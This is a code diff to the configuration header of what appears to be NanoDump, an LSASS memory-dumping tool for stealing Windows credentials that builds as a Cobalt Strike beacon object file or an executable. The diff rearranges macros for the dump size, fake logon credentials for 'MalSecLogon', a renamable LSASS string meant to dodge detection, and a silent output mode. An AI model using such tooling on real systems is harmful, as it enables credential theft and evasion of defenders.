@@ -5,9 +5,22 @@
 #include <stdio.h>
 #include <time.h>
 
+// amount of memory requested to write the dump: 200 MiB
+#define DUMP_MAX_SIZE 0x0c800000
+
+// fake credentials used by MalSecLogon
+#define NANODUMP_USER   L"NanoDumpUser"
+#define NANODUMP_DOMAIN L"NanoDumpDomain"
+#define NANODUMP_PASSWD L"NanoDumpPwd"
+
+// change to remove the "LSASS" string from the binaries
+#define LSASS "LSASS"
+
+// permissions requested by NtOpenProcess
 #define LSASS_PERMISSIONS PROCESS_QUERY_INFORMATION|PROCESS_VM_READ
 
-#define LSASS "LSASS"
+// chunk size used in download_file: 900 KiB
+#define CHUNK_SIZE 0xe1000
 
 #if _WIN64
  #define PROCESS_PARAMETERS_OFFSET 0x20
@@ -61,11 +74,6 @@
 #define PAGE_NOACCESS 0x01
 #define PAGE_GUARD 0x100
 
-// 200 MiB
-#define DUMP_MAX_SIZE 0xc800000
-// 900 KiB
-#define CHUNK_SIZE 0xe1000
-
 #ifdef _M_IX86
  // x86 has conflicting types with these functions
  #define NtClose _NtClose
@@ -91,7 +99,6 @@
  WINBASEAPI void * WINAPI KERNEL32$HeapAlloc (HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
  WINBASEAPI BOOL   WINAPI KERNEL32$HeapFree (HANDLE, DWORD, PVOID);
  WINBASEAPI DWORD  WINAPI KERNEL32$GetLastError (VOID);
- WINBASEAPI VOID   WINAPI KERNEL32$Sleep (DWORD dwMilliseconds);
 
  WINBASEAPI wchar_t * __cdecl MSVCRT$wcsstr(const wchar_t *_Str,const wchar_t *_SubStr);
  WINBASEAPI char *    __cdecl MSVCRT$strrchr(const char *_Str,int _Ch);
@@ -115,7 +122,6 @@
  #define HeapAlloc      KERNEL32$HeapAlloc
  #define HeapFree       KERNEL32$HeapFree
  #define GetLastError   KERNEL32$GetLastError
- #define Sleep          KERNEL32$Sleep
 
  #define wcsstr   MSVCRT$wcsstr
  #define strrchr  MSVCRT$strrchr
@@ -143,22 +149,26 @@
  #define PRINT(...) { \
      BeaconPrintf(CALLBACK_OUTPUT, __VA_ARGS__); \
  }
-#else
+#elif defined(EXE)
  #define PRINT(...) { \
      fprintf(stdout, __VA_ARGS__); \
      fprintf(stdout, "\n"); \
  }
+#else
+ #define PRINT(...)
 #endif
 
 #if defined(BOF)
  #define PRINT_ERR(...) { \
      BeaconPrintf(CALLBACK_ERROR, __VA_ARGS__); \
  }
-#else
+#elif defined(EXE)
  #define PRINT_ERR(...) { \
      fprintf(stdout, __VA_ARGS__); \
      fprintf(stdout, "\n"); \
  }
+#else
+ #define PRINT_ERR(...)
 #endif
 
 #if defined(DEBUG) && defined(BOF)
@@ -166,7 +176,7 @@
      BeaconPrintf(CALLBACK_OUTPUT, "DEBUG: %s:%d:%s(): ", __FILE__, __LINE__, __FUNCTION__); \
      BeaconPrintf(CALLBACK_OUTPUT, __VA_ARGS__); \
  }
-#elif defined(DEBUG) && !defined(BOF)
+#elif defined(DEBUG) && defined(EXE)
  #define DPRINT(...) { \
      fprintf(stderr, "DEBUG: %s:%d:%s(): ", __FILE__, __LINE__, __FUNCTION__); \
      fprintf(stderr, __VA_ARGS__); \
@@ -181,7 +191,7 @@
      BeaconPrintf(CALLBACK_ERROR, "ERROR: %s:%d:%s(): ", __FILE__, __LINE__, __FUNCTION__); \
      BeaconPrintf(CALLBACK_ERROR, __VA_ARGS__); \
  }
-#elif defined(DEBUG) && !defined(BOF)
+#elif defined(DEBUG) && defined(EXE)
  #define DPRINT_ERR(...) { \
      fprintf(stderr, "ERROR: %s:%d:%s(): ", __FILE__, __LINE__, __FUNCTION__); \
      fprintf(stderr, __VA_ARGS__); \
